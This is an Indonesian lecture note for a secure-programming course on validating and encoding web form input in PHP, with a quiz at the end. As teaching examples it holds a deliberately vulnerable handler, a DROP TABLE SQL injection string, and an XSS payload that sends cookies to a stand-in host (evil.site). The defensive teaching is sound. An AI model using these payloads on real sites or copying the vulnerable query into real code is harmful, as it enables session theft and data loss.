---
matkul: Secure Programming
minggu: 3
sks: 3
sumber: S3-Web_Form_Processing_and_Security.pptx
tags: [kuliah/secure-programming, minggu/w03]
status: draft
diproses: 2026-09-04
---

# W03 — Web Form Processing and Security

## Ringkasan
> - Cerita: sebuah **kafe** bikin website dengan satu fitur sederhana: kotak feedback. Pemiliknya nganggep itu cuma kotak saran yang sopan. **Penyerang liat itu sebagai pintu langsung** ke server, database, dan browser semua pengunjung lain.
> - Ide inti: **tiap field form itu input yang nggak bisa dipercaya**. Apa pun yang bisa diketik user, bisa dijadiin senjata penyerang — **kecuali** kamu validasi pas masuk, dan encode pas keluar.
> - **Validasi** itu keputusan terima-atau-tolak, paling baik pakai **allowlist** (definisiin yang BAGUS), bukan blocklist (definisiin yang JELEK — karena daftarnya nggak pernah lengkap).
> - Lima pertanyaan buat tiap field: **Type, Range/Value, Length, Format, Presence.**
> - **Validasi client-side itu UX (kenyamanan). Validasi server-side itu SECURITY.** Yang pertama bisa dimatiin/diubah penyerang; yang kedua nggak bisa dilewatin.
> - Tiga kata yang sering ketuker: **Validate** (tolak yang nggak cocok), **Sanitize** (bersihin bagian yang nggak diinginkan), **Encode/Escape** (bikin data nggak berbahaya di TUJUANnya).
> - Bahaya bergantung DI MANA data itu mendarat: string yang sama aman di satu tempat, berbahaya di tempat lain. **Encode sesuai konteks tujuannya.**

## Konsep Kunci
| Istilah | Penjelasan Singkat |
| --- | --- |
| Validation | Ngecek input sesuai aturan yang diharapkan; terima atau tolak |
| Allowlist | Daftar yang mendefinisikan apa yang VALID; selain itu ditolak |
| Blocklist | Daftar yang mendefinisikan apa yang JAHAT; gampang dielakkan |
| Sanitization | Menghapus/mengubah bagian input yang nggak diinginkan |
| Encoding/Escaping | Bikin data aman ditampilkan di konteks tujuannya (HTML, JS, SQL, dll) |
| SQL Injection | Serangan yang nyisipin perintah SQL lewat input yang nggak divalidasi/di-parameterize |
| XSS (Cross-Site Scripting) | Serangan yang nyisipin script lewat input yang di-echo tanpa di-encode |
| Trust boundary | Garis pemisah antara data yang kamu kontrol dan data dari user |
| Prepared statement | Query SQL yang strukturnya dipisah dari datanya, jadi input nggak bisa jadi kode |

## Isi

### Cerita pembuka: kafe, form feedback, dan jendela yang kebuka
Bayangin kafe kecil ngeluncurin website dengan satu fitur sederhana: kotak feedback. "Kasih tau kami pendapatmu!" Pengunjung ngetik pesan, klik Submit, pemiliknya baca belakangan.

Si pemilik nganggep form itu cuma kotak saran yang sopan. **Penyerang liat sesuatu yang lain: pintu langsung ke server, database, dan browser tiap pengunjung lain.**

Ide inti hari ini: **tiap field form itu input yang nggak bisa dipercaya.** Apa pun yang bisa diketik user, penyerang bisa jadiin senjata — **kecuali kamu validasi pas masuk, dan encode pas keluar.**

### Apa sebenernya web form itu?
Kamu udah tau tabel dan query. Web form itu cuma bagian depan yang ngumpulin nilai-nilai yang akhirnya jadi baris dan parameter.

**Form itu field-field** (`<input>`, `<textarea>`, `<select>`) — tempat manusia ngetik atau milih nilai. **Submit ngirim request** — browser ngepak nilai-nilai itu dan ngirimnya lewat HTTP. **PHP nerima mereka** — di server, nilai nyampe di `$_GET`/`$_POST`, siap diproses. **Mereka jadi data** — disimpan di database, di-echo balik ke halaman, atau dipake buat logika.

**Trust boundary**: semua yang ada di sebelah kiri PHP server itu berasal dari user dan **sepenuhnya di bawah kendali penyerang**. Server adalah tempat kepercayaan harus dipenuhi (earned).

`$_GET` lewat URL — kelihatan, bisa di-bookmark, panjangnya terbatas. `$_POST` lewat body request — nggak muncul di URL, muatan lebih besar. **Realita keamanan: POST nggak lebih aman dari GET.** Keduanya kelihatan buat penyerang yang lagi ngetiknya. "Tersembunyi" cuma artinya tersembunyi dari user yang jujur.

### Input Validation di form sederhana

**Validasi ITU:** ngecek input sesuai aturan yang diharapkan; keputusan terima-atau-tolak; paling baik pakai **allowlist**; soal tipe, panjang, format, rentang; **selalu ditegakkan di server**.

**Validasi BUKAN:** bukan langkah bersih-bersih yang "memperbaiki" input jelek; bukan cukup dengan sendirinya (kamu tetap harus encode pas output); bukan aman kalau cuma dilakukan di JavaScript/browser; bukan blocklist "kata jelek" (penyerang gampang ngelolosin diri); bukan pengganti parameterized query.

> [!info] Analogi
> Bayangin **dua satpam di pintu**.
> **Satpam blocklist**: "Gue bakal usir siapa aja yang ada di daftar pengacau gue." Masalahnya: daftarnya nggak pernah lengkap. Penyerang tinggal nongol pakai penyamaran baru — misalnya nge-block `<script>` tapi orangnya pake `<img onerror>` malah.
> **Satpam allowlist**: "Cuma yang ada di daftar tamu yang boleh masuk. Selain itu nunggu di luar." Definisiin persis kayak apa yang valid; input yang aneh/nggak dikenal **otomatis ditolak** — misal rating harus integer 1–5, titik.

**Lima pertanyaan buat tiap field:**
1. **Type** — apakah jenisnya bener? Angka, email, tanggal — bukan teks bebas di tempat angka
2. **Range/Value** — apa dia dalam batas wajar? Umur 0–120, rating 1–5, jumlah ≥ 1
3. **Length** — kependekan atau kepanjangan banget? Kasih batas biar nggak overflow/disalahgunakan
4. **Format** — cocok sama polanya? Bentuk email, bentuk nomor telepon, bentuk kode pos
5. **Presence** — field yang wajib beneran ada dan nggak kosong?

### Kenali ancamannya: handler naif
```php
// feedback.php — JANGAN DIPAKAI GINI
$rating  = $_POST['rating'];
$message = $_POST['message'];

// langsung masuk database...
$db->query("INSERT INTO reviews VALUES ('$rating','$message')");

// ...dan langsung balik ke halaman
echo "Thanks! You said: $message";
```

**Dua pintu yang kebuka:** nggak ada validasi — rating bisa apa aja, message nggak ada batasnya. Masuk ke DB mentah → **SQL Injection**. Di-echo balik mentah → **Cross-Site Scripting (XSS)**. Input yang sama, dua serangan berbeda — karena nggak pernah dicek atau di-encode.

**Gimana satu tanda kutip merusak query.** Penyerang ngetik ini di kotak message:
```
' );  DROP TABLE reviews;  --
```
Query yang server beneran jalanin jadi:
```sql
INSERT INTO reviews VALUES ('5', ''); 
DROP TABLE reviews;  -- ')
```
Yang kejadian: tanda kutip user nutup string-nya lebih awal, sisanya dibaca sebagai perintah, dan `--` ngomentarin sisa yang berantakan. **Kafe itu baru aja kehilangan seluruh tabel review-nya.** Preview pertahanan: validasi rating-nya (harus 1–5) DAN pakai **parameterized query** biar input nggak pernah diperlakukan sebagai kode.

### Bangun pertahanannya: validasi server-side di PHP
```php
$errors = [];

// 1) TYPE + RANGE (allowlist)
$rating = filter_input(INPUT_POST, 'rating', FILTER_VALIDATE_INT,
  ['options'=>['min_range'=>1, 'max_range'=>5]]);
if ($rating === false) $errors[] = 'Rating must be 1-5';

// 2) LENGTH + PRESENCE
$msg = trim($_POST['message'] ?? '');
if ($msg === '' || strlen($msg) > 500) $errors[] = 'Message 1-500 chars';
```

`filter_input` + `FILTER_VALIDATE_INT` nerapin tipe; `min_range`/`max_range` itu allowlist buat nilainya; `trim()` + batas panjang ngontrol field teksnya. Kumpulin error-nya, baru tolak kalau ada yang salah — **cuma data valid yang lolos gerbang ini.**

**Client-side itu UX, server-side itu keamanan.**

| Client-side (browser) | Server-side (PHP) |
| --- | --- |
| Feedback instan, pengalaman lebih enak | User nggak bisa ngoprek |
| Ngurangin submit salah yang nggak sengaja | Jalan nggak peduli gimana request-nya dateng |
| **Bisa dimatiin, diubah, atau dilewatin** | Satu-satunya validasi yang **nggak bisa dilewatin** penyerang |
| Penyerang tinggal kirim request mentah | **WAJIB** buat tiap field, tiap kali |

Pakai dua-duanya, tapi jangan **pernah** ngandelin browser buat keamanan.

### Input Sanitization & Encoding: setelah validasi nolak yang jelas-jelas jelek, sekarang kita netralisir yang kita simpen

**Tiga kata yang sering keliru:**
- **Validate** — tolak input yang nggak sesuai aturan. *Ini angka 1–5? Kalau bukan — tolak.*
- **Sanitize** — hapus/ubah bagian input yang nggak diinginkan. *Buang tag HTML dari field nama.*
- **Encode/Escape** — bikin data nggak berbahaya buat tujuannya. *Ubah `<` jadi `&lt;` sebelum ditampilin.*

**Analisis ancaman: waktu feedback ngegigit balik (XSS).** Halaman kafe nge-echo pesan langsung balik. Penyerang submit:
```html
<script>fetch('https://evil.site/c?'+document.cookie)</script>
```
Sekarang tiap pengunjung yang buka halaman review, ngejalanin script si penyerang — diam-diam ngirim session cookie mereka. Alurnya: **Attacker** (nyimpen script lewat form) → **Stored** (kesimpen sebagai review biasa) → **Victim** (buka halaman review) → **Theft** (cookie/session dicuri).

**Wawasan kunci: bahaya bergantung di mana data itu mendarat.** String yang sama bisa aman di satu tempat, berbahaya di tempat lain. **Encode sesuai konteks tujuannya.**

| Tujuan | Contoh | Cara encode |
| --- | --- | --- |
| HTML body | `<div>HERE</div>` | `htmlspecialchars()` |
| HTML attribute | `value="HERE"` | `htmlspecialchars(ENT_QUOTES)` |
| JavaScript | `var x = 'HERE'` | Encoding JSON/JS, jangan echo langsung ke `<script>` |
| SQL query | `VALUES ('HERE')` | Prepared statement — bind, jangan concat |
| URL | `?q=HERE` | `urlencode()` / `rawurlencode()` |

**Encode output dengan cara yang bener:**
```php
// AMAN: encode pas KELUAR
echo 'You said: ' . htmlspecialchars($message, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```
`<script>` jadi `&lt;script&gt;` — muncul sebagai teks, nggak pernah dieksekusi browser. Aturan praktisnya: encode di momen output (bukan pas input); selalu set charset (UTF-8); pakai `ENT_QUOTES` biar attribute juga aman; utamakan prepared statement buat SQL; biarin template engine auto-escape kalau bisa.

**Defense in depth buat satu form:**
1. Client hints — pengecekan browser buat UX yang enak (bukan keamanan)
2. Validate (server) — allowlist: tipe, panjang, rentang, format yang bener
3. Sanitize kalau perlu — buang bagian yang nggak semestinya ada di field ini
4. Parameterize SQL — bind nilai biar data nggak pernah jadi kode
5. Encode on output — escape sesuai konteks (HTML, attribute, JS, URL)

**Nggak ada satu lapis pun yang cukup sendirian. Tiap lapis nangkep yang lolos dari lapis lainnya.**

## Diagram & Visual
> [!warning] Deck ini nggak punya gambar non-dekoratif yang bisa diekstrak — kontennya semua teks dan blok kode.

## Istilah Khusus
| Istilah | Penjelasan |
| --- | --- |
| **`filter_input()`** | Fungsi PHP buat validasi/filter nilai dari `$_GET`/`$_POST` sekaligus |
| **`FILTER_VALIDATE_INT`** | Filter yang mastiin nilainya integer, bisa dikasih batas min/max |
| **`htmlspecialchars()`** | Fungsi PHP buat encode karakter berbahaya (`<`, `>`, `&`, `"`) jadi entitas HTML |
| **`ENT_QUOTES`** | Opsi `htmlspecialchars()` biar tanda kutip juga ikut di-escape (penting buat attribute HTML) |
| **PDO** | Lapisan akses database PHP yang mendukung prepared statement |
| **CWE** | Common Weakness Enumeration, katalog standar jenis-jenis kerentanan software |
| **Cheat sheet OWASP** | Panduan praktis dari `cheatsheetseries.owasp.org` buat topik keamanan tertentu (misal XSS, SQLi) |

## Quiz Pemahaman
Level Bloom C4 ke atas.

1. **(C4 – Analisis)** Bandingkan pendekatan blocklist ("blokir kata `<script>`") dan allowlist ("cuma terima huruf, angka, spasi, dan tanda baca dasar") buat field nama pengunjung kafe. Kenapa allowlist tetap lebih kuat meskipun blocklist-nya udah dibikin sangat panjang?
2. **(C4 – Analisis)** Query `INSERT INTO reviews VALUES ('$rating','$message')` bisa diserang lewat DUA jalur berbeda dalam satu baris kode (SQLi lewat `$rating`/`$message` masuk DB, dan XSS lewat `$message` pas di-echo). Pisahkan: bagian mana dari kode itu yang jadi trust boundary buat masing-masing serangan, dan kenapa perbaikan buat satu serangan nggak otomatis nutup yang satunya?
3. **(C5 – Evaluasi)** Seorang developer nulis: `$clean = strip_tags($_POST['message']); echo $clean;` — dia bilang ini udah cukup buat nyegah XSS karena tag HTML-nya udah dibuang. Evaluasi klaim ini: kapan `strip_tags()` doang bisa gagal, dan kenapa `htmlspecialchars()` pas OUTPUT tetap lebih disarankan sebagai lapis terakhir?
4. **(C5 – Evaluasi)** Nilai mana yang lebih krusial buat dibenerin duluan kalau tim kafe cuma punya waktu buat SATU perbaikan sebelum launching: validasi server-side buat field rating, atau encoding output buat field message? Justifikasi jawabanmu pakai konsep "defense in depth".
5. **(C6 – Cipta)** Rancang tabel "Concept → Threat → Control" (kayak di slide 23 W01, tapi versi kamu sendiri) buat SATU fitur baru yang belum dibahas di sesi ini — misalnya kolom "nomor telepon" di form feedback kafe. Sebutkan minimal 2 baris.

## Versi Gue
<!-- JANGAN DISENTUH. Section ini diisi manual oleh pemilik vault. -->

## Terkait
- [[_SecureProgramming]]
- [[W02 - Session, Cookies & File Upload]]
- [[W04 - Web Form File Upload]]
- [[W05 - Web Database I]]
- [[SecureProgramming - Review dan Glosari]]
